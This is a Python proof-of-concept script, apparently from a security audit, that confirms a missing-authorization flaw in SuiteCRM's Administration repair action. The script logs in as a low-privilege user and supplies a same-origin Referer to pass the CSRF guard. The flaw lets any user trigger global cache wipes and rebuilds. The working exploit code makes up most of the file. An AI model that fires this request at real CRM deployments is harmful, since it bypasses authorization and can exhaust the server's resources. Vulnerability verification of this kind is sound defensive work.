#!/usr/bin/env python3
"""
VULN-027 — `Administration action=repair` global rebuild runnable by any authenticated user
===========================================================================================

Sink  : targets/SuiteCRM/modules/Administration/views/view.repair.php:53-56
        RepairAndClear()->repairAndClearAll(['clearAll'], [all modules], false, true);  // no is_admin
Gate  : include/modules.php:285 -> the 'Administration' entry in $adminOnlyList is COMMENTED OUT
Class : CWE-862 Missing Authorization / BFLA -> resource-exhaustion DoS

Plain-English flaw
------------------
`ViewRepair::display()` runs `repairAndClearAll` (wipe every cache + rebuild all
extensions/vardefs/relationships — a heavy, global maintenance operation) with no
is_admin check, and the `Administration` module is commented out of the
`$adminOnlyList` map that would otherwise force admin-only access. Any
authenticated user can therefore repeatedly trigger a full instance rebuild.

Exploitation idea
-----------------
GET `index.php?module=Administration&action=repair` as an ordinary user. (The
cross-site vector is blocked by the empty-Referer CSRF guard, so we send a valid
same-origin Referer — which any real authenticated user's browser supplies — to
isolate the missing *authorization* control.) The response is the full repair
page instead of an access-denied / admin-gate rejection.

What a successful run proves
----------------------------
A non-admin user drives the global repair-and-rebuild routine to completion,
demonstrating an authorization bypass that also enables a low-effort
resource-exhaustion DoS (each call wipes caches and rebuilds all extensions).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, verdict, admin_session, create_user, web_login

LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")


def main():
    banner("VULN-027", "Administration action=repair global rebuild by any user (BFLA/DoS)")
    log("INFO", "sink: modules/Administration/views/view.repair.php:53 repairAndClearAll(); Administration commented out of $adminOnlyList")

    log("SETUP", "admin creates a disposable low-privilege user (is_admin=0)")
    adm = admin_session()
    u = create_user(adm, LOWPRIV_PASS)
    s = web_login(u["user_name"], u["password"])
    log("SETUP", f"authenticated as low-priv user {u['user_name']}")

    d = os.path.dirname(os.path.abspath(__file__))

    # Control: empty Referer -> the modify-action CSRF guard fires (this is NOT the auth control).
    log("STEP", "control: GET repair with NO Referer -> the empty-Referer CSRF guard should block (separate control)")
    rc = s.get(f"{BASE_URL}/index.php", params={"module": "Administration", "action": "repair"}, timeout=180)
    csrf_blocked = "XSRF" in rc.text or "Cross Site" in rc.text
    log("PROOF", f"no-Referer repair: HTTP {rc.status_code}, csrf-guard-blocked={csrf_blocked} (expected True)")

    # The actual authorization test: a legitimately-authenticated user's browser sends a same-origin
    # Referer. If the missing is_admin gate is the only authorization, the repair runs for a non-admin.
    log("STEP", "attack: GET repair WITH a valid same-origin Referer (as any real logged-in user) -> missing is_admin gate")
    r = s.get(f"{BASE_URL}/index.php", params={"module": "Administration", "action": "repair"},
              headers={"Referer": f"{BASE_URL}/index.php?module=Home&action=index"}, timeout=300)

    with open(os.path.join(d, "request.http"), "w") as f:
        f.write("GET /index.php?module=Administration&action=repair HTTP/1.1\r\n"
                "Host: localhost:33116\r\nReferer: http://localhost:33116/index.php?module=Home&action=index\r\n"
                "Cookie: PHPSESSID=<low-priv session>\r\n")
    with open(os.path.join(d, "response.txt"), "w") as f:
        f.write(f"no-Referer control: HTTP {rc.status_code} csrf_blocked={csrf_blocked}\n\n"
                f"valid-Referer attack: HTTP {r.status_code} len={len(r.text)}\n\n{r.text[:600]}")

    xsrf = "XSRF" in r.text or "Cross Site" in r.text
    denied = "not have access" in r.text.lower() or "not authorized" in r.text.lower()
    # repair page renders the standard admin chrome + a large body; access-denied is short/redirect
    ran = (not xsrf) and (not denied) and len(r.text) > 5000 and r.status_code == 200
    log("PROOF", f"valid-Referer repair: HTTP {r.status_code}, len={len(r.text)}, xsrf={xsrf}, denied={denied}, repair-ran={ran}")

    if ran:
        log("OK", "exploit confirmed — a non-admin ran the global repairAndClearAll (no is_admin gate); "
                  "the empty-Referer CSRF guard is the ONLY barrier and is trivially met by any real logged-in user")
        verdict("VULN-027", "CONFIRMED",
                "any authenticated user triggers the global Administration repair/rebuild (BFLA -> DoS)")
        sys.exit(0)
    log("FAIL", f"repair did not run for the non-admin (xsrf={xsrf}, denied={denied}, len={len(r.text)})")
    verdict("VULN-027", "FAILED", "repair was not reachable by the non-admin")
    sys.exit(1)


if __name__ == "__main__":
    main()
